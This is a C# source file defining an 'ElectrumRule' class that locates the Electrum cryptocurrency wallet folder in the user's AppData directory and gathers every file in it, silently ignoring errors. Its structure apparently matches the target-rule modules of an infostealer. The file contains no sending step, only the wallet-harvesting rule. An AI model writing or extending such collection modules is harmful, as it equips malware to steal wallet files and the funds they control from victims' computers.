using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class ElectrumRule : FileScannerRule
    {
        public ElectrumRule()
        {
            base.Name = "Electrum";
        }

        public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
        {
            return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets";
                list.Add(new FileScannerArg
                {
                    Directory = directory,
                    Pattern = "*",
                    Recoursive = false
                });
            }
            catch
            {
            }
            return list;
        }
    }
}
